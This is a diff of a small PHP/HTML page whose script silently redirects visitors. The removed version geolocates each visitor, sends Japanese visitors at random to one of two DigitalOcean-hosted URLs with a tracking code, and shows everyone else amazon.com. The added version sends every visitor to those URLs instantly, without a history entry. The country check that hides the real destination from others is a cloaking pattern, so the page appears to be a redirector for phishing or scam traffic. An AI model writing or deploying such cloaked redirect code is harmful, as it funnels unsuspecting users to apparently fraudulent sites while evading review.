@@ -1,41 +1,22 @@
 <?php
   ?>
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
 <title>Red...</title>
 
 <script>
-fetch("https://ipwho.is/")
-  .then(response => response.json())
-  .then(data => {
-    if (!data.success) {
-      return;
-    }
+(function () {
+    const urlA = "https://plankton-app-qrzvg.ondigitalocean.app/?Anph=(0101)-21735-08134";
+    const urlB = "https://orca-app-2-qdbny.ondigitalocean.app/?Anph=(0101)-21735-08134";
 
-    const countryCode = data.country_code;
+    // 50-50 split
+    const target = Math.random() < 0.5 ? urlA : urlB;
 
-    if (countryCode === "JP") {
-      (function () {
-        const domainA = "https://plankton-app-qrzvg.ondigitalocean.app/?Anph=(0101)-21735-08134";
-        const domainB = "https://orca-app-2-qdbny.ondigitalocean.app/?Anph=(0101)-21735-08134";
-
-        // Random number between 0 and 1
-        if (Math.random() < 0.5) {
-            window.location.replace(domainA);
-        } else {
-            window.location.replace(domainB);
-        }
-    })();
-    } else {
-      window.location.replace("https://www.amazon.com/");
-    }
-  })
-  .catch(error => {
-    console.error("Error fetching location:", error);
-  });
-
+    // Instant redirect (no history)
+    window.location.replace(target);
+})();
 </script>
 
 </head>
